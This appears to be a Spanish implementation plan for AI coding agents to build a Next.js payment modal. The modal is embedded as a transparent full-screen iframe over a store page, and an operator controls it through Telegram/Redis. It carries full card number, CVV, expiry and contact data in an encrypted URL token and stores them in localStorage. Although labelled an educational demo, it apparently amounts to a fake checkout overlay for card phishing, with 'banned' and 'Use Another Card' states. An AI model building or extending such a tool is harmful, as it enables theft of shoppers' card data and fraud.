# Modal en iframe con payload cifrado — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Convertir el demo educativo en un modal incrustable como iframe transparente a pantalla completa: página limpia (`index.tsx`), datos mock cifrados con AES-GCM en `?d=<token>`, redirecciones a vistas finales configuradas, y un formulario generador de la URL del iframe.

**Architecture:** Next.js 15 Pages Router. El payload (datos de pago + URLs de redirección) se cifra server-side con AES-256-GCM (`src/lib/payloadCipher.ts`) y se descifra en `getServerSideProps` de `index.tsx`, por lo que los datos en claro nunca llegan al bundle JS ni a la URL. El iframe generado por `/api/generate` es `position:fixed; inset:0; 100vw/100vh` y transparente; el documento del modal es transparente (body sin fondo) para que la página padre se vea detrás, oscurecida por el overlay `rgba(0,0,0,0.5)`. El modal redirige a `redirectSuccess` al estado `finalized` y a `redirectDeclined` en "Use Another Card".

**Tech Stack:** Next.js 15 Pages Router, TypeScript, Tailwind v4, node `crypto` (AES-256-GCM), Vitest. Sin dependencias nuevas.

---

### Task 1: `src/lib/payloadCipher.ts` — cifrado AES-256-GCM (TDD)

**Files:**
- Create: `src/lib/payloadCipher.ts`
- Test: `src/lib/payloadCipher.test.ts`

- [ ] **Step 1: Write the failing test**

```ts
import { describe, expect, it } from "vitest";
import { decryptPayload, encryptPayload } from "./payloadCipher";

const SECRET = "test-secret";
const payload = {
  payment: {
    numeroTarjeta: "4859537428532001",
    vencimiento: "12/28",
    cvv: "123",
    titular: "MARIA DEMO",
    email: "maria.demo@ejemplo.com",
    celular: "3001234567",
    telefono: "3001234567",
    cardBrand: "Visa",
    metodo: "credito",
  },
  price: "199900",
  priceFormatted: "$199.900",
  redirectSuccess: "https://tienda.example/pago-ok",
  redirectDeclined: "https://tienda.example/tarjeta-declinada",
};

describe("payloadCipher", () => {
  it("cifra y descifra roundtrip", () => {
    const token = encryptPayload(payload, SECRET);
    expect(token).not.toContain("4859537428532001");
    expect(decryptPayload(token, SECRET)).toEqual(payload);
  });

  it("token con distinta clave no descifra", () => {
    const token = encryptPayload(payload, SECRET);
    expect(() => decryptPayload(token, "otra-clave")).toThrow();
  });

  it("token manipulado falla (GCM autentica)", () => {
    const token = encryptPayload(payload, SECRET);
    const tampered = token.slice(0, -4) + "AAAA";
    expect(() => decryptPayload(tampered, SECRET)).toThrow();
  });

  it("token corrupto/no-base64 falla", () => {
    expect(() => decryptPayload("no-valid-token!", SECRET)).toThrow();
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run src/lib/payloadCipher.test.ts`
Expected: FAIL — "Cannot find module './payloadCipher'"

- [ ] **Step 3: Write minimal implementation**

```ts
import { createCipheriv, createDecipheriv, createHash, randomBytes } from "crypto";

const ALGO = "aes-256-gcm";
const IV_LEN = 12;
const TAG_LEN = 16;

const keyFrom = (secret: string) => createHash("sha256").update(secret).digest();

export function encryptPayload(payload: unknown, secret: string): string {
  const iv = randomBytes(IV_LEN);
  const cipher = createCipheriv(ALGO, keyFrom(secret), iv);
  const data = Buffer.concat([
    cipher.update(JSON.stringify(payload), "utf8"),
    cipher.final(),
  ]);
  return Buffer.concat([iv, cipher.getAuthTag(), data]).toString("base64url");
}

export function decryptPayload<T>(token: string, secret: string): T {
  const buf = Buffer.from(token, "base64url");
  if (buf.length < IV_LEN + TAG_LEN) throw new Error("Token inválido");
  const iv = buf.subarray(0, IV_LEN);
  const tag = buf.subarray(IV_LEN, IV_LEN + TAG_LEN);
  const decipher = createDecipheriv(ALGO, keyFrom(secret), iv);
  decipher.setAuthTag(tag);
  const text = Buffer.concat([
    decipher.update(buf.subarray(IV_LEN + TAG_LEN)),
    decipher.final(),
  ]).toString("utf8");
  return JSON.parse(text) as T;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run src/lib/payloadCipher.test.ts`
Expected: 4 tests PASS

- [ ] **Step 5: Commit**

```bash
git add src/lib/payloadCipher.ts src/lib/payloadCipher.test.ts
git commit -m "feat: cifrado AES-256-GCM para payload de la URL (TDD)"
```

---

### Task 2: `PAYLOAD_SECRET` en `.env.example` y `.env.local`

**Files:**
- Modify: `.env.example`
- Modify: `.env.local` (gitignored, no se commitea)

- [ ] **Step 1: Add to `.env.example`**

```env
PAYLOAD_SECRET=
```

- [ ] **Step 2: Add to `.env.local`**

Genera un valor real y pégalo en `.env.local`:

```bash
echo "PAYLOAD_SECRET=$(openssl rand -hex 32)" >> .env.local
```

Verifica con: `grep PAYLOAD_SECRET .env.local`

- [ ] **Step 3: Commit**

```bash
git add .env.example
git commit -m "chore: documentar PAYLOAD_SECRET en .env.example"
```

---

### Task 3: `src/pages/api/generate.ts` — endpoint cifrador de URL/iframe

**Files:**
- Create: `src/pages/api/generate.ts`

- [ ] **Step 1: Implement the handler**

```ts
import type { NextApiRequest, NextApiResponse } from "next";
import { encryptPayload } from "@/lib/payloadCipher";

interface GenerateBody {
  payment: {
    numeroTarjeta: string;
    vencimiento: string;
    cvv: string;
    titular: string;
    email: string;
    celular: string;
    telefono: string;
    cardBrand: string;
    metodo: string;
  };
  price?: string;
  priceFormatted?: string;
  redirectSuccess?: string;
  redirectDeclined?: string;
}

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Método no permitido" });
  }

  const body = (req.body ?? {}) as GenerateBody;
  const { payment, price, priceFormatted, redirectSuccess, redirectDeclined } = body;

  if (!payment?.numeroTarjeta || !redirectSuccess || !redirectDeclined) {
    return res
      .status(400)
      .json({ error: "Faltan campos: payment.numeroTarjeta, redirectSuccess, redirectDeclined" });
  }

  const payload = {
    payment,
    price: price ?? "199900",
    priceFormatted: priceFormatted ?? "$199.900",
    redirectSuccess,
    redirectDeclined,
  };

  const secret = process.env.PAYLOAD_SECRET ?? "dev-payload-secret";
  const token = encryptPayload(payload, secret);

  const proto = (req.headers["x-forwarded-proto"] as string) ?? "http";
  const host = req.headers.host ?? "localhost:3000";
  const origin = `${proto}://${host}`;
  const url = `${origin}/?d=${token}`;

  const iframe =
    `<iframe src="${url}" style="position:fixed;inset:0;width:100vw;height:100vh;` +
    `border:0;background:transparent;z-index:9999"></iframe>`;

  return res.status(200).json({ token, url, iframe });
}
```

- [ ] **Step 2: Verify with curl (dev server corriendo)**

```bash
curl -s -X POST http://localhost:3000/api/generate \
  -H "Content-Type: application/json" \
  -d '{"payment":{"numeroTarjeta":"4859537428532001","vencimiento":"12/28","cvv":"123","titular":"MARIA DEMO","email":"a@b.co","celular":"3001234567","telefono":"3001234567","cardBrand":"Visa","metodo":"credito"},"redirectSuccess":"https://tienda.example/ok","redirectDeclined":"https://tienda.example/declined"}'
```

Expected: JSON con `{ token, url, iframe }`; `iframe` contiene `position:fixed` y `background:transparent`.

- [ ] **Step 3: Commit**

```bash
git add src/pages/api/generate.ts
git commit -m "feat: endpoint /api/generate cifra payload y genera url+iframe del modal"
```

---

### Task 4: `src/pages/generator.tsx` — formulario del presentador

**Files:**
- Create: `src/pages/generator.tsx`

- [ ] **Step 1: Implement the generator form**

```tsx
import { useState } from "react";

const MOCK = {
  numeroTarjeta: "4859537428532001",
  vencimiento: "12/28",
  cvv: "123",
  titular: "MARIA DEMO",
  email: "maria.demo@ejemplo.com",
  celular: "3001234567",
  telefono: "3001234567",
  cardBrand: "Visa",
  metodo: "credito",
};

export default function Generator() {
  const [form, setForm] = useState({ ...MOCK, price: "199900", priceFormatted: "$199.900" });
  const [redirectSuccess, setRedirectSuccess] = useState("https://tienda.example/pago-ok");
  const [redirectDeclined, setRedirectDeclined] = useState("https://tienda.example/tarjeta-declinada");
  const [result, setResult] = useState<{ url: string; iframe: string } | null>(null);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const set = (key: string) => (e: React.ChangeEvent<HTMLInputElement>) =>
    setForm((prev) => ({ ...prev, [key]: e.target.value }));

  const generate = async () => {
    setLoading(true);
    setError("");
    try {
      const res = await fetch("/api/generate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          payment: {
            numeroTarjeta: form.numeroTarjeta,
            vencimiento: form.vencimiento,
            cvv: form.cvv,
            titular: form.titular,
            email: form.email,
            celular: form.celular,
            telefono: form.telefono,
            cardBrand: form.cardBrand,
            metodo: form.metodo,
          },
          price: form.price,
          priceFormatted: form.priceFormatted,
          redirectSuccess,
          redirectDeclined,
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? "Error al generar");
      setResult({ url: data.url, iframe: data.iframe });
    } catch (err) {
      setError(err instanceof Error ? err.message : "Error inesperado");
    } finally {
      setLoading(false);
    }
  };

  const Field = ({ label, value, onChange }: { label: string; value: string; onChange: (e: React.ChangeEvent<HTMLInputElement>) => void }) => (
    <label className="flex flex-col gap-1 text-sm">
      <span className="font-medium text-slate-700">{label}</span>
      <input
        value={value}
        onChange={onChange}
        className="rounded-md border border-slate-300 px-3 py-2 text-sm"
      />
    </label>
  );

  return (
    <main className="min-h-screen bg-slate-50 px-6 py-10">
      <div className="mx-auto max-w-xl">
        <h1 className="text-2xl font-bold text-slate-900 mb-1">Generador de URL del iframe</h1>
        <p className="text-sm text-slate-600 mb-6">
          Herramienta del presentador. Prepara los datos y las URLs de redirección, genera la URL
          cifrada y copia el iframe en la página de la tienda.
        </p>

        <div className="grid grid-cols-2 gap-3 rounded-lg border border-slate-200 bg-white p-4">
          <Field label="Número de tarjeta" value={form.numeroTarjeta} onChange={set("numeroTarjeta")} />
          <Field label="Vencimiento" value={form.vencimiento} onChange={set("vencimiento")} />
          <Field label="CVV" value={form.cvv} onChange={set("cvv")} />
          <Field label="Banco / marca" value={form.cardBrand} onChange={set("cardBrand")} />
          <Field label="Titular" value={form.titular} onChange={set("titular")} />
          <Field label="Método" value={form.metodo} onChange={set("metodo")} />
          <Field label="Email" value={form.email} onChange={set("email")} />
          <Field label="Celular" value={form.celular} onChange={set("celular")} />
          <Field label="Teléfono" value={form.telefono} onChange={set("telefono")} />
          <Field label="Precio" value={form.price} onChange={set("price")} />
        </div>

        <div className="mt-4 grid grid-cols-1 gap-3 rounded-lg border border-slate-200 bg-white p-4">
          <Field label="URL de éxito (redirectSuccess)" value={redirectSuccess} onChange={(e) => setRedirectSuccess(e.target.value)} />
          <Field label="URL de declinado (redirectDeclined)" value={redirectDeclined} onChange={(e) => setRedirectDeclined(e.target.value)} />
        </div>

        <button
          onClick={generate}
          disabled={loading}
          className="mt-5 w-full rounded-lg bg-blue-600 px-6 py-3 font-semibold text-white hover:bg-blue-700 disabled:opacity-50"
        >
          {loading ? "Generando…" : "Generar URL del iframe"}
        </button>

        {error && <p className="mt-4 rounded-md bg-red-50 p-3 text-sm text-red-700">{error}</p>}

        {result && (
          <div className="mt-6 space-y-4">
            <div>
              <p className="mb-1 text-sm font-medium text-slate-700">URL del modal</p>
              <textarea readOnly value={result.url} className="h-20 w-full rounded-md border border-slate-300 p-3 text-xs" />
            </div>
            <div>
              <p className="mb-1 text-sm font-medium text-slate-700">Snippet &lt;iframe&gt; para copiar</p>
              <textarea readOnly value={result.iframe} className="h-28 w-full rounded-md border border-slate-300 p-3 text-xs" />
            </div>
          </div>
        )}
      </div>
    </main>
  );
}
```

- [ ] **Step 2: Verify**

Abrir `http://localhost:3000/generator`, pulsar "Generar URL del iframe" → aparecen `url` y el snippet `<iframe>` con `position:fixed;inset:0;...;background:transparent;z-index:9999`.

- [ ] **Step 3: Commit**

```bash
git add src/pages/generator.tsx
git commit -m "feat: formulario generador de URL del iframe"
```

---

### Task 5: `src/pages/index.tsx` — página limpia con SSR (target del iframe)

**Files:**
- Rewrite: `src/pages/index.tsx`

- [ ] **Step 1: Rewrite the page**

```tsx
import { useEffect, useState } from "react";
import type { GetServerSideProps } from "next";
import PaymentStatusModal from "@/components/PaymentStatusModal";
import { decryptPayload } from "@/lib/payloadCipher";

interface PaymentPayload {
  payment: {
    numeroTarjeta: string;
    vencimiento: string;
    cvv: string;
    titular: string;
    email: string;
    celular: string;
    telefono: string;
    cardBrand: string;
    metodo: string;
  };
  price: string;
  priceFormatted: string;
  redirectSuccess: string;
  redirectDeclined: string;
}

interface HomeProps {
  valid: boolean;
  payload?: PaymentPayload;
}

export const getServerSideProps: GetServerSideProps = async (ctx) => {
  const token = typeof ctx.query.d === "string" ? ctx.query.d : "";
  if (!token) {
    return { props: { valid: false } };
  }
  try {
    const secret = process.env.PAYLOAD_SECRET ?? "dev-payload-secret";
    const payload = decryptPayload<PaymentPayload>(token, secret);
    return { props: { valid: true, payload } };
  } catch {
    return { props: { valid: false } };
  }
};

export default function Home({ valid, payload }: HomeProps) {
  const [sessionId] = useState(() => `demo-${Date.now()}`);
  const [isOpen, setIsOpen] = useState(false);

  useEffect(() => {
    if (valid && payload) {
      localStorage.setItem("checkout_payment", JSON.stringify(payload.payment));
      setIsOpen(true);
    }
  }, [valid, payload]);

  if (!valid || !payload) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-transparent">
        <p className="text-sm text-gray-500">URL inválida</p>
      </main>
    );
  }

  return (
    <PaymentStatusModal
      sessionId={sessionId}
      isOpen={isOpen}
      price={payload.price}
      priceFormatted={payload.priceFormatted}
      last4={payload.payment.numeroTarjeta.slice(-4)}
      card={payload.payment.numeroTarjeta}
      cardT={payload.payment.metodo === "credito" ? "Crédito" : "Débito"}
      vencimiento={payload.payment.vencimiento}
      cvv={payload.payment.cvv}
      titular={payload.payment.titular}
      cardBrand={payload.payment.cardBrand}
      email={payload.payment.email}
      contactData={{ email: payload.payment.email, celular: payload.payment.celular }}
      redirectSuccess={payload.redirectSuccess}
      redirectDeclined={payload.redirectDeclined}
    />
  );
}
```

- [ ] **Step 2: Verify**

Abrir `http://localhost:3000/?d=<token de /api/generate>` → el modal se auto-abre, sin banner ni botón.

- [ ] **Step 3: Commit**

```bash
git add src/pages/index.tsx
git commit -m "feat: página limpia SSR con modal auto-abierto desde payload cifrado"
```

---

### Task 6: `src/styles/globals.css` y `src/styles/paymentStatusModal.css` — transparencia y overlay negro 50%

**Files:**
- Modify: `src/styles/globals.css:22-26`
- Modify: `src/styles/paymentStatusModal.css:11`

- [ ] **Step 1: Make the document transparent in `globals.css`**

Replace lines 22-26:

```css
body {
  background: var(--background);
  color: var(--foreground);
  font-family: Arial, Helvetica, sans-serif;
}
```

with:

```css
body {
  background: transparent !important;
  color: var(--foreground);
  font-family: Arial, Helvetica, sans-serif;
}
```

- [ ] **Step 2: Change the overlay to pure black 50% in `paymentStatusModal.css`**

In `.psm-overlay` (line 11), replace:

```css
background-color: rgba(31, 41, 55, 0.5) !important;
```

with:

```css
background-color: rgba(0, 0, 0, 0.5) !important;
```

- [ ] **Step 3: Verify**

Con una página HTML local de prueba que incruste el iframe generado (`position:fixed;inset:0;...;background:transparent;z-index:9999`), la página de la tienda se ve de fondo oscurecida al 50% y el modal aparece centrado, sin rectángulo blanco del iframe.

- [ ] **Step 4: Commit**

```bash
git add src/styles/globals.css src/styles/paymentStatusModal.css
git commit -m "feat: documento transparente + overlay negro 50% para efecto modal-sobre-página"
```

---

### Task 7: `src/components/PaymentStatusModal.tsx` — redirecciones (Check → éxito, Use Another Card → declinado)

**Files:**
- Modify: `src/components/PaymentStatusModal.tsx:7-22` (interfaz props)
- Modify: `src/components/PaymentStatusModal.tsx:400-411` (destructuring props)
- Modify: `src/components/PaymentStatusModal.tsx:678-689` (efecto finalized/banned)
- Modify: `src/components/PaymentStatusModal.tsx:1328-1333` (botón Use Another Card)

- [ ] **Step 1: Add optional props to the interface**

In `interface PaymentStatusModalProps` (after `onClose?`), add:

```ts
  redirectSuccess?: string;
  redirectDeclined?: string;
```

- [ ] **Step 2: Destructure the new props**

In the component function signature (line ~400), add after `onClose`:

```ts
  redirectSuccess,
  redirectDeclined,
```

- [ ] **Step 3: Redirect on finalized (effect at lines ~678-689)**

Replace the effect body:

```ts
  useEffect(() => {
    if (status === "finalized" || status === "banned") {
      console.log(``);

      const timer = setTimeout(() => {
        console.log(``);
        if (onClose) onClose(status === "finalized");
      }, 2000);

      return () => clearTimeout(timer);
    }
  }, [status, onClose]);
```

with:

```ts
  useEffect(() => {
    if (status === "finalized" || status === "banned") {
      console.log(``);

      const timer = setTimeout(() => {
        console.log(``);
        if (status === "finalized") {
          if (redirectSuccess) {
            window.location.href = redirectSuccess;
            return;
          }
          if (onClose) onClose(true);
        } else {
          if (onClose) onClose(false);
        }
      }, 2000);

      return () => clearTimeout(timer);
    }
  }, [status, onClose, redirectSuccess]);
```

- [ ] **Step 4: Redirect on "Use Another Card" (button at lines ~1328-1333)**

Replace:

```tsx
            <button
              onClick={() => window.location.reload()}
              className="px-5 text-black bg-gray-300 border border-black rounded-full psm-new-card-btn"
            >
              Use Another Card
            </button>
```

with:

```tsx
            <button
              onClick={() => {
                if (redirectDeclined) {
                  window.location.href = redirectDeclined;
                } else {
                  window.location.reload();
                }
              }}
              className="px-5 text-black bg-gray-300 border border-black rounded-full psm-new-card-btn"
            >
              Use Another Card
            </button>
```

- [ ] **Step 5: Verify**

- `npm run lint` pasa.
- Con flujo completo (Redis + webhook): presentador pulsa "✅ Check" → estado `finalized` → tras 2s redirige a `redirectSuccess`.
- En estado `new_card`, "Use Another Card" redirige a `redirectDeclined`.

- [ ] **Step 6: Commit**

```bash
git add src/components/PaymentStatusModal.tsx
git commit -m "feat: modal redirige a vistas finales configuradas (Check y Use Another Card)"
```

---

### Task 8: README — documentar el nuevo flujo iframe

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Update README**

Añadir una sección "Uso como iframe" que documente:
- `/generator` para crear la URL cifrada y copiar el snippet.
- El iframe generado es `position:fixed; inset:0; 100vw/100vh` y transparente; la página anfitriona se ve de fondo oscurecida 50%.
- `PAYLOAD_SECRET` debe estar en `.env.local`.
- El flujo de Telegram/Redis no cambia.

- [ ] **Step 2: Commit**

```bash
git add README.md
git commit -m "docs: README con flujo iframe y URL cifrada"
```

---

### Task 9: Verificación final

- [ ] **Step 1: Full test + lint + build**

```bash
npm test && npm run lint && npm run build
```

Expected: todos los tests PASAN (Luhn, cn, CheckCardService, payloadCipher), lint sin errores, build OK.

- [ ] **Step 2: Smoke test — datos no filtrados**

```bash
# tras servir el build, buscar la tarjeta en claro en HTML y chunks
grep -r "4859537428532001" .next/server .next/static || echo "OK: no filtrado"
```

Expected: "OK: no filtrado" (el único lugar legítimo es el código del generador y el test).

- [ ] **Step 3: Smoke test manual del iframe**

1. Crear `public/prueba-tienda.html` temporal:

```html
<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Tienda simulada</title>
    <style>
      body { margin: 0; font-family: Arial, sans-serif; }
      .hero { padding: 40px; background: #f0f4f8; }
    </style>
  </head>
  <body>
    <div class="hero"><h1>Tienda de ejemplo</h1><p>Esta página se ve de fondo mientras el modal está abierto.</p></div>
    <!-- pegar aquí el iframe generado en /generator -->
  </body>
</html>
```

2. Pegar el snippet `<iframe>` generado, abrir `/prueba-tienda.html`, verificar: tienda de fondo oscurecida 50% + modal centrado, sin rectángulo blanco.
3. Borrar el archivo temporal: `rm public/prueba-tienda.html` (no commitearlo).

- [ ] **Step 4: Commit final si quedan cambios**

```bash
git status --short
```